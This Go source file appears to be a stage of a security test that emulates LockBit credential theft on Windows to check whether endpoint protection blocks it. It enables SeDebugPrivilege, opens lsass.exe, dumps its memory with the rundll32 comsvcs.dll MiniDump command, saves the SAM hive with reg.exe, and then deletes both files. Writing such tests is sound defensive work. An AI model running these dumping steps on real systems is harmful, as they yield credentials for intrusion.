// Stage 2 — T1003.001 LSASS Memory + T1003.002 Security Account Manager
// F0RT1KA Security Testing Framework
// SB-PC-2026-001 [LOCKBIT] — Objetivo 2: Acceso a credenciales privilegiadas
//
// LockBit affiliates dump LSASS memory and the SAM hive to obtain privileged
// credentials (AA23-165A: T1003.001 documented for LockBit; comsvcs.dll
// MiniDump is the LockBit-documented LOLBin dump pattern).
//
// This stage:
//   1. T1003.001 — enables SeDebugPrivilege (real dumper tradecraft — and the
//      precondition that makes an OpenProcess denial MEANINGFUL evidence:
//      without it, Windows denies the lsass handle as baseline privilege-model
//      behavior, not a protection action). Then locates lsass.exe via
//      Toolhelp32 snapshot, ATTEMPTS OpenProcess(PROCESS_VM_READ |
//      PROCESS_QUERY_INFORMATION) — the access EVENT is the detection signal
//      (Sysmon EID 10 / DeviceEvents) — and attempts the LockBit-documented
//      LOLBin dump:
//         rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <pid> <LOG_DIR>\lsass.dmp full
//      Classification combines the handle result + dump file existence
//      (os.Stat after a short sleep). NO manual ReadProcessMemory, NO
//      MiniDumpWriteDump from our own code. Any produced .dmp is DELETED in
//      cleanup — no credential material persists.
//   2. T1003.002 — attempts `reg.exe save HKLM\SAM <LOG_DIR>\sam.save` and a
//      registry-API open of HKLM\SAM. Classification is driven by reg.exe
//      (which uses SeBackupPrivilege and normally succeeds when elevated):
//      OS denial vs success + file evidence. The registry-API open is logged
//      as telemetry — its denial is the baseline SAM ACL (only SYSTEM may
//      read SAM), NOT a protection action, so it is never counted as a block
//      (Rule 8). sam.save is DELETED in cleanup.
//
// Denial evidence is only counted when running elevated (admin/SYSTEM) AND
// the relevant privilege was successfully enabled — matching Rule 8's
// "operation that normally succeeds in this context returning an OS-emitted
// denial".
//
// EXIT CODES: 0 = at least one credential-access primitive executed unimpeded,
// 126 = at least one sub-technique positively prevented (with the other not
// successful), 999 = prerequisite error or fully inconclusive.

//go:build windows
// +build windows

package main

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

const (
	TEST_UUID      = "298cc137-ea39-4cf0-9b2d-b1c59a3cbacb"
	TECHNIQUE_ID   = "T1003.001"
	TECHNIQUE_NAME = "Privileged Credential Access (T1003.001/T1003.002)"
	STAGE_ID       = 2
)

const (
	StageSuccess     = 0
	StageBlocked     = 126
	StageQuarantined = 105
	StageError       = 999
)

const lsassImageName = "lsass.exe"

// The access mask a credential dumper requests: VM_READ for secret material,
// QUERY_INFORMATION to resolve the target.
const lsassAccessMask = windows.PROCESS_VM_READ | windows.PROCESS_QUERY_INFORMATION

// Sub-technique outcomes (Rule 4 — separate counters per critical metric).
type subOutcome int

const (
	outcomeError subOutcome = iota
	outcomeBlocked
	outcomeSuccess
)

var (
	elevatedContext bool
	seDebugEnabled  bool
)

func main() {
	AttachLogger(TEST_UUID, fmt.Sprintf("Stage %d: %s", STAGE_ID, TECHNIQUE_ID))
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Starting %s", TECHNIQUE_NAME))
	LogStageStart(STAGE_ID, TECHNIQUE_ID, TECHNIQUE_NAME)

	elevatedContext = isAdmin() || isSystemContext()
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Execution context: elevated=%v system=%v", elevatedContext, isSystemContext()))

	// T1003.001 tradecraft: real dumpers enable SeDebugPrivilege before touching
	// lsass. Only with the privilege enabled does a later OS denial count as
	// positive protection evidence (Rule 8) — otherwise the denial is the
	// baseline privilege model and must be treated as inconclusive.
	seDebugEnabled = false
	if err := enablePrivilege("SeDebugPrivilege"); err != nil {
		LogMessage("WARNING", TECHNIQUE_ID, fmt.Sprintf("SeDebugPrivilege enable returned: %v - LSASS handle denial will be treated as inconclusive", err))
		fmt.Printf("[STAGE %s] SeDebugPrivilege not available: %v\n", TECHNIQUE_ID, err)
	} else {
		seDebugEnabled = true
		LogMessage("INFO", TECHNIQUE_ID, "SeDebugPrivilege enabled for LSASS access primitive")
	}

	dumpPath := filepath.Join(LOG_DIR, "lsass.dmp")
	samPath := filepath.Join(LOG_DIR, "sam.save")

	// Cleanup: no credential material may persist (both paths best-effort).
	defer func() {
		for _, p := range []string{dumpPath, samPath} {
			if _, err := os.Stat(p); err == nil {
				if rerr := os.Remove(p); rerr != nil {
					LogMessage("WARNING", TECHNIQUE_ID, fmt.Sprintf("cleanup: failed to remove %s: %v", p, rerr))
				} else {
					LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("cleanup: removed %s", p))
				}
			}
		}
	}()

	lsassOutcome := attemptLSASSAccess(dumpPath)
	samOutcome := attemptSAMAccess(samPath)

	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("Sub-technique outcomes: LSASS=%v SAM=%v", lsassOutcome, samOutcome))

	var exitCode int
	switch {
	case lsassOutcome == outcomeSuccess || samOutcome == outcomeSuccess:
		exitCode = StageSuccess
		fmt.Printf("[STAGE %s] Credential-access primitive executed without prevention\n", TECHNIQUE_ID)
		LogMessage("SUCCESS", TECHNIQUE_ID, "At least one credential-access sub-technique executed unimpeded")
		LogStageEnd(STAGE_ID, TECHNIQUE_ID, "success", "Credential access primitive unprotected")
	case lsassOutcome == outcomeBlocked || samOutcome == outcomeBlocked:
		exitCode = StageBlocked
		fmt.Printf("[STAGE %s] Credential-access positively prevented (LSASS=%v SAM=%v)\n", TECHNIQUE_ID, lsassOutcome, samOutcome)
		LogMessage("BLOCKED", TECHNIQUE_ID, "At least one credential-access sub-technique positively prevented")
		LogStageBlocked(STAGE_ID, TECHNIQUE_ID, "Credential access positively prevented (see sub-technique evidence)")
	default:
		exitCode = StageError
		fmt.Printf("[STAGE %s] Stage error - prerequisites not met or inconclusive\n", TECHNIQUE_ID)
		LogMessage("ERROR", TECHNIQUE_ID, "Credential-access stage inconclusive or prerequisite failure")
		LogStageEnd(STAGE_ID, TECHNIQUE_ID, "error", "Stage error or inconclusive")
	}
	os.Exit(exitCode)
}

// attemptLSASSAccess performs the T1003.001 access primitive + LOLBin dump attempt.
func attemptLSASSAccess(dumpPath string) subOutcome {
	LogMessage("WARN", "T1003.001", "Detection signal: OpenProcess(lsass.exe, PROCESS_VM_READ) from a non-whitelisted binary")

	pid, err := findProcessByName(lsassImageName)
	if err != nil {
		LogMessage("ERROR", "T1003.001", fmt.Sprintf("process enumeration returned: %v", err))
		return outcomeError
	}
	if pid == 0 {
		// lsass is always running on Windows; absence means we cannot observe it.
		LogMessage("ERROR", "T1003.001", "lsass.exe not located in process snapshot - enumeration failure")
		return outcomeError
	}
	LogMessage("INFO", "T1003.001", fmt.Sprintf("Located %s (PID %d)", lsassImageName, pid))

	handle, hErr := windows.OpenProcess(lsassAccessMask, false, pid)
	handleDenied := false
	handleGranted := false
	if hErr != nil {
		denial := containsAnyStr(strings.ToLower(hErr.Error()),
			[]string{"access is denied", "access denied"})
		if denial && elevatedContext && seDebugEnabled {
			// With SeDebugPrivilege enabled, this OpenProcess normally succeeds
			// as admin/SYSTEM — an OS denial is positive evidence a protection
			// layer acted (PPL/EDR/CredGuard).
			handleDenied = true
			LogMessage("WARN", "T1003.001", fmt.Sprintf("lsass handle open returned OS denial in elevated+SeDebug context: %v", hErr))
			fmt.Printf("[STAGE %s] LSASS handle open DENIED with SeDebugPrivilege enabled - protection evidence\n", TECHNIQUE_ID)
		} else {
			LogMessage("WARNING", "T1003.001", fmt.Sprintf("lsass handle open failed (not attributable to protection in this context): %v", hErr))
			fmt.Printf("[STAGE %s] LSASS handle open failed (inconclusive in this context): %v\n", TECHNIQUE_ID, hErr)
		}
	} else {
		handleGranted = true
		windows.CloseHandle(handle)
		LogMessage("WARN", "T1003.001", fmt.Sprintf("Acquired PROCESS_VM_READ handle to %s (PID %d) - handle closed immediately", lsassImageName, pid))
		fmt.Printf("[STAGE %s] Acquired PROCESS_VM_READ handle to lsass (PID %d)\n", TECHNIQUE_ID, pid)
	}

	// LockBit-documented LOLBin dump attempt (comsvcs.dll MiniDump). Runs
	// regardless of the handle outcome — it performs its own OpenProcess and
	// is itself the high-value telemetry.
	fmt.Printf("[STAGE %s] Attempting comsvcs.dll MiniDump against lsass PID %d\n", TECHNIQUE_ID, pid)
	LogMessage("WARN", "T1003.001", "Attempting rundll32 comsvcs.dll MiniDump (LockBit-documented LOLBin pattern)")

	cmd := exec.Command("rundll32.exe",
		`C:\Windows\System32\comsvcs.dll,`, "MiniDump",
		fmt.Sprintf("%d", pid), dumpPath, "full")
	out, runErr := cmd.CombinedOutput()
	outStr := strings.TrimSpace(string(out))
	LogProcessExecution("rundll32.exe",
		fmt.Sprintf("rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump %d %s full", pid, dumpPath),
		0, runErr == nil, 0, outStr)

	// Classify from dump file existence (os.Stat after sleep).
	time.Sleep(2 * time.Second)
	dumpProduced := false
	if fi, statErr := os.Stat(dumpPath); statErr == nil && fi.Size() > 0 {
		dumpProduced = true
		LogMessage("CRITICAL", "T1003.001", fmt.Sprintf("LSASS dump file produced (%d bytes) - credential dumping unimpeded", fi.Size()))
		fmt.Printf("[STAGE %s] LSASS dump produced (%d bytes) - UNIMPEDED\n", TECHNIQUE_ID, fi.Size())
	}

	switch {
	case dumpProduced:
		return outcomeSuccess
	case handleGranted:
		// The VM_READ primitive was granted unhindered; the dump file did not
		// materialize (comsvcs internals may fail for benign reasons). The
		// credential-access primitive itself is unprotected.
		LogMessage("WARN", "T1003.001", "VM_READ handle granted but dump file not produced - handle primitive unprotected, dump path inconclusive")
		return outcomeSuccess
	case handleDenied:
		// Positive denial on the handle AND no dump produced.
		if outStr != "" {
			LogMessage("INFO", "T1003.001", fmt.Sprintf("rundll32 output: %s", outStr))
		}
		return outcomeBlocked
	}
	// No handle, no dump, no positive denial evidence.
	if outStr != "" {
		LogMessage("INFO", "T1003.001", fmt.Sprintf("rundll32 output (inconclusive): %s", outStr))
	}
	if runErr != nil {
		LogMessage("INFO", "T1003.001", fmt.Sprintf("rundll32 exit status (inconclusive): %v", runErr))
	}
	return outcomeError
}

// attemptSAMAccess performs the T1003.002 SAM hive extraction attempt.
func attemptSAMAccess(samPath string) subOutcome {
	fmt.Printf("[STAGE %s] Attempting reg.exe save HKLM\\SAM (T1003.002)\n", TECHNIQUE_ID)
	LogMessage("WARN", "T1003.002", "Attempting reg.exe save HKLM\\SAM (requires SeBackupPrivilege)")

	cmd := exec.Command("reg.exe", "save", `HKLM\SAM`, samPath)
	out, runErr := cmd.CombinedOutput()
	outStr := strings.TrimSpace(string(out))
	LogProcessExecution("reg.exe", fmt.Sprintf("reg.exe save HKLM\\SAM %s", samPath), 0, runErr == nil, 0, outStr)

	time.Sleep(500 * time.Millisecond)
	samProduced := false
	if fi, statErr := os.Stat(samPath); statErr == nil && fi.Size() > 0 {
		samProduced = true
		LogMessage("CRITICAL", "T1003.002", fmt.Sprintf("SAM hive saved to disk (%d bytes) - unimpeded", fi.Size()))
		fmt.Printf("[STAGE %s] SAM hive saved (%d bytes) - UNIMPEDED\n", TECHNIQUE_ID, fi.Size())
	}
	if samProduced {
		return outcomeSuccess
	}

	// Registry-API open of HKLM\SAM — telemetry only. The default SAM ACL
	// grants read to SYSTEM only, so a denial here is baseline Windows
	// behavior, never counted as a protection action (Rule 8). A successful
	// open in this context would mean the process runs as SYSTEM and SAM is
	// readable — logged for the record.
	k, regErr := registry.OpenKey(registry.LOCAL_MACHINE, `SAM`, registry.QUERY_VALUE)
	if regErr == nil {
		k.Close()
		LogMessage("WARN", "T1003.002", "Registry-API open of HKLM\\SAM succeeded (SYSTEM context) - SAM readable via API")
		// reg.exe save failed but the API succeeded: the hive is readable, yet
		// no file was produced. Inconclusive for the extraction objective.
		return outcomeError
	}
	LogMessage("INFO", "T1003.002", fmt.Sprintf("Registry-API open of HKLM\\SAM returned: %v (baseline ACL - telemetry only)", regErr))

	// reg.exe save failed to produce a file. Count as a block only when the
	// failure carries OS denial evidence AND we are elevated (where
	// SeBackupPrivilege normally makes this succeed).
	outLower := strings.ToLower(outStr + " " + errString(runErr))
	if elevatedContext && containsAnyStr(outLower, []string{"access is denied", "access denied", "denied"}) {
		LogMessage("WARN", "T1003.002", fmt.Sprintf("reg.exe save returned OS denial in elevated context: %s", outStr))
		fmt.Printf("[STAGE %s] reg.exe save HKLM\\SAM DENIED in elevated context - protection evidence\n", TECHNIQUE_ID)
		return outcomeBlocked
	}

	LogMessage("WARNING", "T1003.002", fmt.Sprintf("reg.exe save did not produce a file (err=%v out=%s) - not attributable to protection", runErr, outStr))
	fmt.Printf("[STAGE %s] reg.exe save produced no file (err=%v out=%q) - inconclusive\n", TECHNIQUE_ID, runErr, outStr)
	return outcomeError
}

// enablePrivilege enables the named privilege (e.g. SeDebugPrivilege) on the
// current process token — standard credential-dumper tradecraft.
func enablePrivilege(name string) error {
	var token windows.Token
	if err := windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, &token); err != nil {
		return fmt.Errorf("OpenProcessToken returned: %v", err)
	}
	defer token.Close()

	var luid windows.LUID
	if err := windows.LookupPrivilegeValue(nil, windows.StringToUTF16Ptr(name), &luid); err != nil {
		return fmt.Errorf("LookupPrivilegeValue(%s) returned: %v", name, err)
	}

	tp := windows.Tokenprivileges{
		PrivilegeCount: 1,
		Privileges: [1]windows.LUIDAndAttributes{
			{Luid: luid, Attributes: windows.SE_PRIVILEGE_ENABLED},
		},
	}
	if err := windows.AdjustTokenPrivileges(token, false, &tp, 0, nil, nil); err != nil {
		return fmt.Errorf("AdjustTokenPrivileges returned: %v", err)
	}
	return nil
}

// findProcessByName walks a Toolhelp32 process snapshot and returns the PID of
// the first process whose image name matches (case-insensitive). 0 = not found.
func findProcessByName(name string) (uint32, error) {
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0, fmt.Errorf("snapshot creation returned: %v", err)
	}
	defer windows.CloseHandle(snapshot)

	var entry windows.ProcessEntry32
	entry.Size = uint32(unsafe.Sizeof(entry))

	if err := windows.Process32First(snapshot, &entry); err != nil {
		return 0, fmt.Errorf("first process read returned: %v", err)
	}

	for {
		exeName := windows.UTF16ToString(entry.ExeFile[:])
		if strings.EqualFold(exeName, name) {
			return entry.ProcessID, nil
		}
		if err := windows.Process32Next(snapshot, &entry); err != nil {
			if err == windows.ERROR_NO_MORE_FILES {
				return 0, nil
			}
			return 0, fmt.Errorf("next process read returned: %v", err)
		}
	}
}

func errString(err error) string {
	if err == nil {
		return ""
	}
	return err.Error()
}

func containsAnyStr(s string, tokens []string) bool {
	for _, t := range tokens {
		if strings.Contains(s, t) {
			return true
		}
	}
	return false
}

// isSystemContext reports whether the process runs as SYSTEM (Rule 2).
func isSystemContext() bool {
	username := os.Getenv("USERNAME")
	return strings.HasSuffix(username, "$") || strings.EqualFold(username, "SYSTEM")
}
